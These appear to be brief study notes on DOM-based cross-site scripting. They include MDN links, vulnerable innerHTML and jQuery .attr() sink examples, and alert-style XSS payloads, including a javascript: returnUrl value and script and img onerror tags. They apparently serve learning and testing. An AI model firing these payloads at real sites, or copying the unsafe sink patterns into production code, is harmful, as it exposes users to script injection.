[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/span](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/span)

[https://developer.mozilla.org/en-US/docs/Web](https://developer.mozilla.org/en-US/docs/Web)

innerHTML

[https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML)

```
const name = "<img src='x' onerror='alert(1)'>";
el.innerHTML = name;
```

.attr()

```
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

`?returnUrl=javascript:alert(document.domain)`

```
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```